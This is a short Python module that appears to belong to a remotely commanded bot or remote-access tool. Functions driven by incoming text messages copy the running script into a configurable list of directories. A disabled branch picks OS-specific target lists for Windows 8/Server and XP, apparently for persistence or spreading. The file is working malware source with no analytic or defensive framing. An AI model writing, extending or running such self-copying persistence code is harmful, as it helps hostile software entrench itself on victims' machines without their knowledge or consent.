import os
import shutil
import sys
import constants

COPYDIRS = constants.COPYDIRS

def get_dirs(_):
    try: return COPYDIRS
    except Exception as e: return f"Error in get_dirs(): {e}"

def add_dir(message):
    try:
        global COPYDIRS
        dir_to_add = message.split(" ")[1]
        COPYDIRS.append(dir_to_add)
        return f"Added {dir_to_add}, all dirs: {COPYDIRS}"
    except Exception as e: return f"Error in add_dir(): {e}"

def copy_to_dir(dir):
    script_path = os.path.abspath(sys.argv[0])
    shutil.copy2(script_path, dir)
    return f"Successfully copied script to {dir}."

def get_script_path(_):
    try:
        script_path = os.path.abspath(sys.argv[0])
        return f"Current script path: {script_path}"
    except Exception as e: return f"Error in get_script_path(): {e}"

def copy_default(_):
    try:
        rstring = ""
        for target in COPYDIRS:
            try: rstring += copy_to_dir(target) + "\n"
            except Exception as e: rstring += f"Error copying to {target}: {e}"
        return rstring
    except Exception as e: return f"Error in copy_default(): {e}"

def copy_default_deprecated(message):
    return
    try:
        machine = message.split(" ")[1]
        if machine == "8" or machine == "server":
            rstring = ""
            for target in WIN8:
                try:
                    rstring += copy_to_dir(target) + "\n"
                except Exception as e: rstring += f"Error copying to {target}: {e}"
            return f"Successful Copy"
        elif machine == "xp":
            for target in WINXP:
                try: copy_to_dir(target)
                except: pass
            return f"Successful Copy"
        else: return f"Invalid machine name: {machine}"
    except Exception as e: return f"Error in copy_default(): {e}"

def copy_dir_msg(message):
    try:
        target = message.split(" ", 1)[1]
        return copy_to_dir(target)
    except Exception as e: return f"Error in copy_dir_msg(): {e}"
